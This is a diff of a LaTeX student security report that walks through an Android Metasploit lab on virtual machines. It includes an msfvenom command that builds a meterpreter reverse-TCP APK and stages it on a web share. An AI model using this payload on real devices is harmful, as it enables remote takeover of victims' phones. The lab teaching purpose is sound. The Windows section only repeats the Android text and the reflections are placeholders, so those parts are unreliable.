@@ -16,7 +16,7 @@
 \usepackage[backend=biber]{biblatex}
 \addbibresource{bibfile.bib}
 \setlength{\tabcolsep}{18pt}
-\renewcommand{\arraystretch}{1.5}
+\renewcommand{\arraystretch}{1.1}
 \renewcommand{\chaptername}{Section}
 \hypersetup{
     colorlinks=true,
@@ -573,10 +573,12 @@ GIFs on the Blog were sourced from \url{https://tenor.com/}\\\\
 Additionally, the screenshots taken were from VMs we implemented in VirtualBox and other images for the headers were sourced from Google Images.
 \chapter{Scenario 1: Android exploit}
 \label{sec:sec1}
+\section{Overview}
 The scenario is described as follows:
 \begin{displayquote}
-\textit{A person (that will be known as the victim in further discussions), opens a SMS received on their mobile device. This SMS has a malicious link embedded in it, or has a link that redirects to a malicious site. The link automatically downloads and runs an Android application package also known in other terms as an APK file. This APK file is what the Android Operating System uses to install applications. This malicious Application, once installed gives the Hacker (known as a perpetrator in an attack) full control over the deceive to outside parties, including the perpetrator. From here on out, the perpetrator has the victim in the palm of their hands, and can do what every they like to the device as well as carry out further attacks against the victim.}
+\textit{A person (that will be known as the victim in further discussions), opens a SMS received on their mobile device. This SMS has a malicious link embedded in it, or has a link that redirects to a malicious site. The link automatically downloads and runs an Android application package also known in other terms as an APK file. This APK file is what the Android Operating System uses to install applications. This malicious Application, once installed gives the Hacker (known as a perpetrator in an attack) full control over the device to outside parties, including the perpetrator. From here on out, the perpetrator has the victim in the palm of their hands, and can do what every they like to the device as well as carry out further attacks against the victim.}
 \end{displayquote}
+\section{Carrying out the exploit}
 Here are the steps taken to exploit the Android virtual machine.\\\\
 Step 1: Open up the Metasploit console in Kali Linux by running the following command below:
 \begin{minted}
@@ -703,9 +705,9 @@ fontsize=\footnotesize,
 breaklines,
 ]
 {Shell}
-msfvenom –p android/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=4444 R > /root/filename.apk
+msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=4444 R > /var/www/html/share/filename.apk
 \end{minted}
-
+A comprehensive list of commands for post-exploitation can be found in Metasploit's official documentation. These are shown below.\cite{comm}
 \inputminted[
 frame=lines,
 framesep=2mm,
@@ -714,7 +716,40 @@ bgcolor=LightBlue,
 fontsize=\footnotesize,
 breaklines,
 ]{Text}{commands.txt}
+\section{Countermeasures}
 \chapter{Scenario 2: Windows exploit}
+\section{Overview}
+The scenario is described as follows:
+\begin{displayquote}
+\textit{A person (that will be known as the victim in further discussions), opens a SMS received on their mobile device. This SMS has a malicious link embedded in it, or has a link that redirects to a malicious site. The link automatically downloads and runs an Android application package also known in other terms as an APK file. This APK file is what the Android Operating System uses to install applications. This malicious Application, once installed gives the Hacker (known as a perpetrator in an attack) full control over the device to outside parties, including the perpetrator. From here on out, the perpetrator has the victim in the palm of their hands, and can do what every they like to the device as well as carry out further attacks against the victim.}
+\end{displayquote}
+\section{Carrying out the exploit}
+\section{Countermeasures}
+\chapter{Closing remarks}
+\section{Reflection}
+Joshua Esterhuizen had the following to say:
+\begin{displayquote}
+Lorem ipsum
+\end{displayquote}
+Affaan Muhammad had the following to say:
+\begin{displayquote}
+Lorem ipsum
+\end{displayquote}
+\section{Work Consensus}
+All members in the group contributed to this project and a 50/50 balance between work allocation was kept. Below is a table showing how the work was divided in this project amongst the 2 members i.e. Affaan \& Joshua
+\begin{table}[H]
+\centering
+\begin{tabular}{@{}ll@{}}
+\toprule
+\multicolumn{1}{c}{Affaan}   & \multicolumn{1}{c}{Joshua}         \\ \midrule
+Scenario 1     & Scenario 2             \\
+Blog & Blog            \\
+Testing                      & Testing                            \\
+Bug fixes                    & Bug fixes                          \\
+Proofreading                        & Proofreading                              \\
+Documentation                & Metasploit Literature Review \\ \bottomrule
+\end{tabular}
+\end{table}
 \chapter{Additional readings and miscellaneous information}
 \url{https://citizenlab.ca/}
 \printbibliography[heading=bibintoc]
